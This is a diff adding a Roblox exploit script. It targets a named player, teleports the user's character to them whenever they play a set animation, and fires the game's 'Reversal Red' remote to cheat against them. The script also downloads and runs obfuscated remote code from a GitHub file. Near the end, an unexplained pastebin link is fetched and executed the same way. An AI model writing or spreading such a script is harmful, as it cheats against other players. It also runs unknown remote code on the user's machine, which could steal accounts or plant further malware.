@@ -1,0 +1,70 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TARGET_PLAYER_NAME = getgenv().TargetPlayerName
+local TARGET_ANIMATION_ID = "rbxassetid://137654778575373"
+
+if not TARGET_PLAYER_NAME then
+    warn("Set your username before executing")
+    return
+end
+
+local LocalPlayer = Players.LocalPlayer
+
+local module = loadstring(game:HttpGet(
+    "https://raw.githubusercontent.com/Dragonfly5101/Minosr/refs/heads/main/obfuscated.lua"
+))()
+
+local ReversalRemote =
+    ReplicatedStorage.Knit.Knit.Services.ReversalRedService.RE.Activated
+
+local function getTorso(character)
+    return character:FindFirstChild("HumanoidRootPart")
+        or character:FindFirstChild("Torso")
+end
+
+local function hookCharacter(character)
+    local humanoid = character:WaitForChild("Humanoid")
+    local animator = humanoid:WaitForChild("Animator")
+
+    animator.AnimationPlayed:Connect(function(track)
+        local anim = track.Animation
+        if not anim then return end
+
+        if anim.AnimationId == TARGET_ANIMATION_ID then
+            local localChar = LocalPlayer.Character
+            if not localChar then return end
+
+            local localHRP = localChar:FindFirstChild("HumanoidRootPart")
+            local targetTorso = getTorso(character)
+
+            if localHRP and targetTorso then
+                local offsetDistance = 1
+                local offset = targetTorso.CFrame.LookVector * offsetDistance
+                local desiredCFrame = CFrame.new(targetTorso.Position + offset, targetTorso.Position + offset + targetTorso.CFrame.LookVector)
+
+                localHRP.CFrame = desiredCFrame
+
+                module.RedStartCFrame(desiredCFrame)
+
+                local args = {
+                    game.Workspace.Characters[LocalPlayer.Name]
+                        .Moveset["Reversal Red"]
+                }
+
+                ReversalRemote:FireServer(unpack(args))
+            end
+        end
+    end)
+end
+
+local targetPlayer = Players:FindFirstChild(TARGET_PLAYER_NAME)
+if not targetPlayer then
+    warn("Target player not found:", TARGET_PLAYER_NAME)
+    return
+end
+
+if targetPlayer.Character then
+    hookCharacter(targetPlayer.Character)
+end
+loadstring(game:HttpGet("https://pastebin.com/raw/SVq8nM0S"))()
+targetPlayer.CharacterAdded:Connect(hookCharacter)
